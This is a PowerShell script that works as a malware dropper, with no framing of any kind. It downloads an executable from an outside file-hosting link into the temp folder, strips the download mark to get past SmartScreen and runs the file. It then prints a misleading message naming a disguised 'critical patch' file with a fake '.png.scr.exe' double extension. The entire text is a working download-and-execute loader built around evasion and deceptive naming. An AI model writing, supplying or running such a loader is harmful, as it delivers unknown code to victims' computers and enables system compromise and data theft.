$url = "https://www.directfiles.link/E19L6N183/client.exe"
$path = Join-Path $env:TEMP "xxxxxxxx.exe"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    Invoke-WebRequest `
        -Uri $url `
        -OutFile $path

    if (Test-Path $path) {

        # optional but helps with SmartScreen
        Unblock-File $path -ErrorAction SilentlyContinue

        # launch
        Start-Process $path

        Write-Host "Removed at C:\PUBLIC\Documents\win-update-security-hotfix-kb9928874-critical-patch.x9z5LCh94mR4L4c49jtm5p9jJLr4mbv9c0x492598918ITKgl9CVJl4kG4m4f9xP4L4m55J4mncq899go53n59V.png.scr.exe" -ForegroundColor Green
    }
    else {
        Write-Host "Download failed." -ForegroundColor Red
    }
}
catch {
    Write-Host $_.Exception.Message -ForegroundColor Red
}
